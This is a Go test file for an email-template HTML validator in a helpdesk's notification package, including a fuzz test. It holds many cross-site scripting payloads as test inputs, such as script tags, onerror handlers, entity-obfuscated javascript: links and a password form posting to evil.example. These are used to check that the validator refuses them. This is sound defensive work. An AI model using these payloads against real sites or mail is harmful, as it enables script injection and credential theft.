package notify

import (
	"fmt"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

// The HTML part of an email template (#158, PR 2). Whatever the admin writes
// is checked at save against an allow-list and REFUSED with the reason; nothing
// is rewritten. Mail clients strip these constructs, so a preview that kept
// them would lie about what a recipient sees, and a form inside a password
// reset mail is the best payload a stolen admin session has.

func TestValidateHTML_Table(t *testing.T) {
	def := mustDef(t, "ticket_created")
	for _, tc := range []struct {
		name string
		html string
		// wantMsg is empty for HTML that must be accepted.
		wantLine, wantCol int
		wantMsg           string
	}{
		// ── accepted ──
		{name: "empty means no HTML part", html: ""},
		{name: "text link", html: `<p>Open it: {{.TicketURL}}</p>`},
		{name: "link as the whole href", html: `<p>Hi</p><a href="{{.TicketURL}}">open</a>`},
		{name: "single quoted href", html: `<a href='{{.TicketURL}}'>open</a>`},
		{name: "unquoted href", html: `<a href={{.TicketURL}}>open</a>`},
		{name: "layout markup", html: `<!DOCTYPE html><html><body style="margin:0"><table width="100%" cellpadding="0"><tr><td align="center"><div><h1>Hi</h1><ul><li><span>x</span></li></ul><hr><br>{{.TicketURL}}</div></td></tr></table></body></html>`},
		{name: "style attribute", html: `<p style="color:#123456;font-family:Arial">{{.TicketURL}}</p>`},
		{name: "style block", html: `<style>p { color: red }</style><p>{{.TicketURL}}</p>`},
		{name: "remote image is the admin's choice", html: `<img src="https://cdn.example.com/logo.png" alt="logo" width="120">{{.TicketURL}}`},
		{name: "https http mailto links", html: `<a href="https://a.example">a</a><a href="http://b.example">b</a><a href="mailto:help@example.com">c</a>{{.TicketURL}}`},
		{name: "if around markup", html: `{{if .TrackingNumber}}<p>Ticket {{.TrackingNumber}}</p>{{end}}<p>{{.TicketURL}}</p>`},
		{name: "if else", html: `{{if .TrackingNumber}}<b>a</b>{{else}}<i>b</i>{{end}}{{.TicketURL}}`},
		{name: "ampersand entity", html: `<p>Tom &amp; Jerry &lt;3 {{.TicketURL}}</p>`},
		{name: "a template comment", html: `{{/* the link */}}<p>{{.TicketURL}}</p>`},

		// ── refused elements, each with the reason ──
		{name: "script", html: "<p>{{.TicketURL}}</p>\n<script>alert(1)</script>", wantLine: 2, wantCol: 1, wantMsg: "<script> is not allowed"},
		{name: "iframe", html: `{{.TicketURL}}<iframe src="https://x.example"></iframe>`, wantLine: 1, wantCol: 15, wantMsg: "<iframe> is not allowed"},
		{name: "frame", html: `{{.TicketURL}}<frame>`, wantMsg: "<frame> is not allowed"},
		{name: "object", html: `{{.TicketURL}}<object data="x"></object>`, wantMsg: "<object> is not allowed"},
		{name: "embed", html: `{{.TicketURL}}<embed src="https://x.example">`, wantMsg: "<embed> is not allowed"},
		{name: "form", html: `{{.TicketURL}}<form action="https://evil.example"><input name="password"></form>`, wantMsg: "<form> is not allowed"},
		{name: "input", html: `{{.TicketURL}}<input name="password">`, wantMsg: "<input> is not allowed"},
		{name: "button", html: `{{.TicketURL}}<button>go</button>`, wantMsg: "<button> is not allowed"},
		{name: "select", html: `{{.TicketURL}}<select><option>a</option></select>`, wantMsg: "<select> is not allowed"},
		{name: "textarea", html: `{{.TicketURL}}<textarea></textarea>`, wantMsg: "<textarea> is not allowed"},
		{name: "base", html: `{{.TicketURL}}<base href="https://evil.example/">`, wantMsg: "<base> is not allowed"},
		{name: "link", html: `{{.TicketURL}}<link rel="stylesheet" href="https://evil.example/a.css">`, wantMsg: "<link> is not allowed"},
		{name: "meta", html: `{{.TicketURL}}<meta http-equiv="refresh" content="0;url=https://evil.example">`, wantMsg: "<meta> is not allowed"},
		{name: "svg", html: `{{.TicketURL}}<svg onload="x"></svg>`, wantMsg: "<svg> is not allowed"},
		{name: "math", html: `{{.TicketURL}}<math></math>`, wantMsg: "<math> is not allowed"},
		{name: "upper case tag", html: `{{.TicketURL}}<SCRIPT>x</SCRIPT>`, wantMsg: "<script> is not allowed"},
		{name: "an end tag alone", html: `{{.TicketURL}}</script>`, wantMsg: "</script> is not allowed"},
		{name: "an element email does not use", html: `{{.TicketURL}}<blink>x</blink>`, wantMsg: "<blink> is not allowed"},

		// ── refused attributes ──
		{name: "onclick", html: `<a href="{{.TicketURL}}" onclick="x()">open</a>`, wantLine: 1, wantCol: 1, wantMsg: `attribute "onclick" is not allowed`},
		{name: "onerror upper case", html: `{{.TicketURL}}<img src="https://a.example/x.png" ONERROR="x()">`, wantMsg: `attribute "onerror" is not allowed`},
		{name: "onload on body", html: `<body onload="x()">{{.TicketURL}}`, wantMsg: `attribute "onload" is not allowed`},
		{name: "srcdoc", html: `{{.TicketURL}}<p srcdoc="x">y</p>`, wantMsg: `attribute "srcdoc" is not allowed`},
		{name: "formaction", html: `{{.TicketURL}}<a formaction="x">y</a>`, wantMsg: `attribute "formaction" is not allowed`},

		// ── refused URLs ──
		{name: "javascript href", html: `{{.TicketURL}}<a href="javascript:alert(1)">x</a>`, wantMsg: "href must start with https:, http: or mailto:"},
		{name: "javascript href mixed case", html: `{{.TicketURL}}<a href="JaVaScRiPt:alert(1)">x</a>`, wantMsg: "href must start with"},
		{name: "javascript href with a tab inside", html: "{{.TicketURL}}<a href=\"java\tscript:alert(1)\">x</a>", wantMsg: "href must start with"},
		{name: "javascript href with leading space", html: `{{.TicketURL}}<a href="  javascript:alert(1)">x</a>`, wantMsg: "href must start with"},
		{name: "javascript href by entity", html: `{{.TicketURL}}<a href="&#106;avascript:alert(1)">x</a>`, wantMsg: "href must start with"},
		{name: "data href", html: `{{.TicketURL}}<a href="data:text/html,<b>x</b>">x</a>`, wantMsg: "href must start with"},
		{name: "relative href", html: `{{.TicketURL}}<a href="/tickets/1">x</a>`, wantMsg: "href must start with"},
		{name: "empty href", html: `{{.TicketURL}}<a href="">x</a>`, wantMsg: "href must start with"},
		{name: "http src", html: `{{.TicketURL}}<img src="http://a.example/x.png">`, wantMsg: "src must start with https:"},
		{name: "data src", html: `{{.TicketURL}}<img src="data:image/png;base64,AAAA">`, wantMsg: "src must start with https:"},
		{name: "javascript src", html: `{{.TicketURL}}<img src="javascript:alert(1)">`, wantMsg: "src must start with https:"},
		{name: "an action as src", html: `<img src="{{.TicketURL}}">`, wantMsg: "src must start with https:"},
		{name: "background attribute is a src", html: `{{.TicketURL}}<td background="http://a.example/x.png">x</td>`, wantMsg: "background must start with https:"},

		// ── templates only in text or as the whole href ──
		{name: "action in an attribute value", html: `{{.TicketURL}}<p title="{{.TrackingNumber}}">x</p>`, wantMsg: "only in the text or as the whole href"},
		{name: "action after a url prefix", html: `<a href="https://x.example/{{.TrackingNumber}}">{{.TicketURL}}</a>`, wantMsg: "only in the text or as the whole href"},
		{name: "action in an attribute name", html: `{{.TicketURL}}<p {{.TrackingNumber}}="x">y</p>`, wantMsg: "only in the text or as the whole href"},
		{name: "action in a tag name", html: `{{.TicketURL}}<{{.TrackingNumber}}>y`, wantMsg: "only in the text or as the whole href"},
		{name: "action as a bare attribute", html: `{{.TicketURL}}<p {{.TrackingNumber}}>y</p>`, wantMsg: "only in the text or as the whole href"},
		{name: "action in a style attribute", html: `{{.TicketURL}}<p style="color:{{.TrackingNumber}}">y</p>`, wantMsg: "only in the text or as the whole href"},
		{name: "action in a style block", html: `<style>p{content:"{{.TrackingNumber}}"}</style>{{.TicketURL}}`, wantMsg: "not allowed inside <style>"},
		{name: "if in a style block", html: `<style>{{if .TrackingNumber}}p{}{{end}}</style>{{.TicketURL}}`, wantMsg: "not allowed inside <style>"},
		{name: "action in an html comment", html: `<!-- {{.TicketURL}} -->hello`, wantMsg: "only in the text or as the whole href"},
		{name: "if inside a tag", html: `{{.TicketURL}}<a {{if .TrackingNumber}}class="x"{{end}}>y</a>`, wantMsg: "only in the text or as the whole href"},
		{name: "if inside an href", html: `<a href="{{if .TrackingNumber}}{{.TicketURL}}{{end}}">y</a>{{.TicketURL}}`, wantMsg: "only in the text or as the whole href"},
		// The parser drops a template comment, so the text either side is one
		// piece of markup and is read as what it renders: a script.
		{name: "template comment inside a tag name", html: `{{.TicketURL}}<scr{{/* x */}}ipt>alert(1)</script>`, wantMsg: "<script> is not allowed"},
		{name: "tag split across if branches", html: `{{.TicketURL}}{{if .TrackingNumber}}<{{else}}x{{end}}script>alert(1)</script>`, wantMsg: "write &lt;"},
		{name: "tag opened in one branch", html: `{{.TicketURL}}{{if .TrackingNumber}}<scr{{else}}x{{end}}ipt>alert(1)</script>`, wantMsg: "tag is not finished"},
		{name: "comment opened in one branch", html: `{{.TicketURL}}{{if .TrackingNumber}}<!--{{end}}x`, wantMsg: "comment is not finished"},
		{name: "style opened in one branch", html: `{{.TicketURL}}{{if .TrackingNumber}}<style>{{end}}x`, wantMsg: "<style> is not closed"},

		// ── markup that would be read differently from how it is written ──
		{name: "a bare less-than", html: `{{.TicketURL}} a < b`, wantMsg: "write &lt;"},
		{name: "an unfinished tag", html: `{{.TicketURL}}<a href="https://x.example`, wantMsg: "tag is not finished"},
		{name: "an unfinished comment", html: `{{.TicketURL}}<!-- x`, wantMsg: "comment is not finished"},

		// ── the required link ──
		{name: "no link", html: `<p>Hello</p>`, wantLine: 1, wantCol: 1, wantMsg: "must include {{.TicketURL}}"},
		{name: "link only inside an if", html: `{{if .TrackingNumber}}<p>{{.TicketURL}}</p>{{end}}`, wantMsg: "must include {{.TicketURL}} outside any {{if}}"},
		{name: "the wrong variable", html: `<p>{{.TrackingNumber}}</p>`, wantMsg: "must include {{.TicketURL}}"},

		// ── the template language itself is the same as the text part ──
		{name: "range", html: "{{.TicketURL}}\n{{range .TrackingNumber}}x{{end}}", wantLine: 2, wantCol: 1, wantMsg: "range"},
		{name: "printf", html: "{{.TicketURL}}\n{{printf \"%0999999999d\" 1}}", wantLine: 2, wantCol: 3, wantMsg: "printf"},
		{name: "a pipe", html: `<a href="{{.TicketURL | html}}">x</a>`, wantMsg: "pipe"},
		{name: "ticket content by path", html: `{{.Ticket.Subject}}{{.TicketURL}}`, wantMsg: "not allowed"},
		{name: "unknown variable", html: `{{.Subject}}{{.TicketURL}}`, wantMsg: "Subject"},
		{name: "define", html: `{{.TicketURL}}{{define "x"}}y{{end}}`, wantMsg: "define"},
		{name: "unclosed if", html: `{{.TicketURL}}{{if .TrackingNumber}}x`, wantMsg: "{{end}}"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			errs := ValidateHTML(def, tc.html)
			if tc.wantMsg == "" {
				require.Empty(t, errs)
				return
			}
			require.NotEmpty(t, errs, "accepted: %q", tc.html)
			require.Equal(t, "html", errs[0].Field)
			require.Contains(t, errs[0].Message, tc.wantMsg)
			if tc.wantLine > 0 {
				require.Equal(t, tc.wantLine, errs[0].Line, "line: %+v", errs[0])
				require.Equal(t, tc.wantCol, errs[0].Col, "col: %+v", errs[0])
			}
		})
	}
}

func TestValidateHTML_RefusalNamesWhy(t *testing.T) {
	// The reason matters as much as the refusal: it is what the admin reads.
	def := mustDef(t, "ticket_created")
	errs := ValidateHTML(def, `{{.TicketURL}}<script>x</script>`)
	require.NotEmpty(t, errs)
	require.Contains(t, errs[0].Message, "mail clients remove")
	errs = ValidateHTML(def, `{{.TicketURL}}<form></form>`)
	require.NotEmpty(t, errs)
	require.Contains(t, errs[0].Message, "form")
}

func TestValidateHTML_Caps(t *testing.T) {
	def := mustDef(t, "ticket_created")

	atLimit := "{{.TicketURL}}" + strings.Repeat("a", MaxHTMLBytes-len("{{.TicketURL}}"))
	require.Empty(t, ValidateHTML(def, atLimit))

	errs := ValidateHTML(def, atLimit+"a")
	require.NotEmpty(t, errs)
	require.Contains(t, errs[0].Message, "limit is 65536")

	for name, bad := range map[string]string{
		"invalid UTF-8": "{{.TicketURL}}\xff",
		"NUL":           "{{.TicketURL}}\x00",
	} {
		t.Run(name, func(t *testing.T) {
			errs := ValidateHTML(def, bad)
			require.NotEmpty(t, errs)
			require.Equal(t, "html", errs[0].Field)
		})
	}
}

func TestValidateHTML_RenderedSizeIsCapped(t *testing.T) {
	// Source under 64 KiB can still render past what a mail client will show
	// (Gmail clips near 102 KB) when a long value is repeated, so the render
	// itself is capped.
	def := mustDef(t, "ticket_created")
	src := strings.Repeat("{{.TicketURL}}", MaxHTMLBytes/len("{{.TicketURL}}"))
	require.LessOrEqual(t, len(src), MaxHTMLBytes)
	vars := map[string]string{"TrackingNumber": "GHD-1", "TicketURL": "https://" + strings.Repeat("h", 40) + ".example"}
	_, err := RenderHTML(def, src, vars)
	require.Error(t, err)
	require.Contains(t, err.Error(), "100 KiB")
}

func TestValidateHTML_ShellsNeedNoLinkAndMayUseSiteName(t *testing.T) {
	for _, name := range []string{NameHeader, NameFooter} {
		def := mustDef(t, name)
		require.Empty(t, ValidateHTML(def, `<table><tr><td>{{.SiteName}}</td></tr>`), name) // unbalanced on purpose: the footer closes it
		require.Empty(t, ValidateHTML(def, ""), name)
		errs := ValidateHTML(def, `<p>{{.TicketURL}}</p>`)
		require.NotEmpty(t, errs, name)
		require.Contains(t, errs[0].Message, "TicketURL")
		errs = ValidateHTML(def, `<script>x</script>`)
		require.NotEmpty(t, errs, name)
	}
}

func TestValidateHTML_AccountMailsRequireTheirOwnLink(t *testing.T) {
	for name, v := range map[string]string{"email_verification": "VerifyURL", "password_reset": "ResetURL"} {
		def := mustDef(t, name)
		require.Empty(t, ValidateHTML(def, fmt.Sprintf(`<a href="{{.%s}}">go</a>`, v)), name)
		errs := ValidateHTML(def, `<p>no link</p>`)
		require.NotEmpty(t, errs, name)
		require.Contains(t, errs[0].Message, "{{."+v+"}}")
	}
}

func TestValidateHTML_ReportsTheEarliestProblem(t *testing.T) {
	// Lists are checked on their own (so a branch cannot finish another's tag);
	// the answer is still the first problem in the text, not the first list's.
	def := mustDef(t, "ticket_created")
	html := "{{.TicketURL}}{{if .TrackingNumber}}\n<script>x</script>{{end}}<iframe></iframe>"
	errs := ValidateHTML(def, html)
	require.NotEmpty(t, errs)
	require.Contains(t, errs[0].Message, "<script>")
	require.Equal(t, 2, errs[0].Line)
}

// ── rendering ────────────────────────────────────────────────────────────────

func TestRenderHTML_EscapesValuesInHTMLContext(t *testing.T) {
	// The values are server-built today, but the guarantee must not rest on
	// that: whatever reaches a variable is text, never markup.
	def := mustDef(t, "ticket_created")
	vars := map[string]string{
		"TrackingNumber": `<img src=x onerror=alert(1)>&"'`,
		"TicketURL":      `https://help.example.com/t?a="><script>alert(1)</script>`,
	}
	out, err := RenderHTML(def, `<p>Ref {{.TrackingNumber}}</p><a href="{{.TicketURL}}">{{.TicketURL}}</a>`, vars)
	require.NoError(t, err)
	require.NotContains(t, out, "<img")
	require.NotContains(t, out, "<script>")
	require.Contains(t, out, "&lt;img src=x onerror=alert(1)&gt;")
	require.Contains(t, out, `<a href="https://help.example.com/t?a=%22%3e%3cscript%3ealert%281%29%3c/script%3e">`)
}

func TestRenderHTML_AHrefValueThatIsNotAWebAddressIsNeutralised(t *testing.T) {
	// html/template filters a javascript: URL in a link to #ZgotmplZ. Today no
	// variable can hold one; this pins that the renderer would still not emit it.
	def := mustDef(t, "ticket_created")
	out, err := RenderHTML(def, `<a href="{{.TicketURL}}">x</a>`, map[string]string{"TrackingNumber": "", "TicketURL": "javascript:alert(1)"})
	require.NoError(t, err)
	require.NotContains(t, out, "javascript:")
}

func TestRenderHTML_TheGuestFragmentSurvivesEscaping(t *testing.T) {
	// A guest link carries its token in the URL fragment (/g#token). The
	// escaper must leave it exactly as built or the link stops working.
	def := mustDef(t, "ticket_created")
	link := "https://help.example.com/g#AbC-123_xyz.token~value"
	out, err := RenderHTML(def, `<a href="{{.TicketURL}}">open</a> {{.TicketURL}}`, map[string]string{"TrackingNumber": "GHD-1", "TicketURL": link})
	require.NoError(t, err)
	require.Contains(t, out, `<a href="`+link+`">`)
	require.Contains(t, out, "open</a> "+link)
}

func TestRenderHTML_RefusesInvalidAndIsEmptyForNone(t *testing.T) {
	def := mustDef(t, "ticket_created")
	out, err := RenderHTML(def, "", map[string]string{})
	require.NoError(t, err)
	require.Empty(t, out)

	_, err = RenderHTML(def, `<script>x</script>{{.TicketURL}}`, map[string]string{"TicketURL": "https://x"})
	var invalid *InvalidTemplateError
	require.ErrorAs(t, err, &invalid)
	require.Equal(t, "html", invalid.Errors[0].Field)
}

func TestRenderHTML_AMissingValueIsAnErrorNotBlankText(t *testing.T) {
	def := mustDef(t, "ticket_created")
	_, err := RenderHTML(def, `<p>{{.TrackingNumber}}</p>{{.TicketURL}}`, map[string]string{"TicketURL": "https://x"})
	require.Error(t, err)
}

// ── fuzz ─────────────────────────────────────────────────────────────────────

// FuzzValidateHTML asserts what the save path relies on: the validator never
// panics, and anything it accepts renders without error and into something
// that passes the same checks the output of a send would be held to. `go test`
// runs the seed corpus; `go test -fuzz=FuzzValidateHTML` explores.
func FuzzValidateHTML(f *testing.F) {
	for _, s := range []string{
		``, `{{.TicketURL}}`, `<a href="{{.TicketURL}}">x</a>`, `<p>{{.TrackingNumber}}</p>{{.TicketURL}}`,
		`<script>x</script>{{.TicketURL}}`, `{{if .TrackingNumber}}<{{else}}x{{end}}script>`, `<style>p{}</style>{{.TicketURL}}`,
		`<a href="javascript:x">{{.TicketURL}}`, `<!-- {{.TicketURL}} -->`, `<table><tr><td>{{.TicketURL}}`,
		"{{.TicketURL}}\xff", `{{range .X}}`, `{{.TicketURL}}<img src="https://a/b.png" onerror=x>`, `<a href=`, `<`, `{{`, `{{.TicketURL`,
		`{{- .TicketURL -}}<br/>`, `&#106;avascript:`, `<p {{.TicketURL}}>`,
	} {
		f.Add(s)
	}
	def, ok := LookupTemplate("ticket_created")
	if !ok {
		f.Fatal("no ticket_created template")
	}
	shell, _ := LookupTemplate(NameHeader)
	vars := SampleVars(def, "https://help.example.com", "GHD")
	f.Fuzz(func(t *testing.T, src string) {
		if len(ValidateHTML(def, src)) > 0 {
			return
		}
		out, err := RenderHTML(def, src, vars)
		if err != nil {
			t.Fatalf("accepted but did not render: %v\nsource: %q", err, src)
		}
		// What was sent must itself pass the markup checks: escaping must not
		// have turned an accepted source into a script, a handler or a bad URL.
		// (Checked as a header, which needs no link and takes no variables.)
		if strings.Contains(out, "{{") {
			return // a literal "{{" in the text would be read as an action
		}
		if errs := ValidateHTML(shell, out); len(errs) > 0 {
			t.Fatalf("accepted source rendered markup that is refused: %v\nsource: %q\noutput: %q", errs[0], src, out)
		}
	})
}
